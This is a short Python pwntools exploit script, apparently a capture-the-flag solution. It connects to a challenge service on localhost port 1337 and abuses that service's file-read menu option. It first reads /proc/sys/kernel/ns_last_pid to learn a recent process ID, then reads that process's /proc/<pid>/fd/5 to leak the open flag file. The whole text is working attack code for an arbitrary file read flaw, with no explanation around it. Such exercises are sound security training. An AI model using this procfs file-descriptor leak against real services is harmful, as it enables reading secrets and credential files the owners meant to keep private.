from pwn import *

IP = "localhost"
PORT = 1337
p = remote(IP, PORT)

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"file name: ")
p.sendline(b"/proc/sys/kernel/ns_last_pid")
las_pid = p.recvline().decode().strip()

p.recvuntil(b">>> ")
p.sendline(b"1")
p.recvuntil(b"file name: ")
p.sendline(f"/proc/{las_pid}/fd/5".encode())

flag = p.recvline()
print(flag)
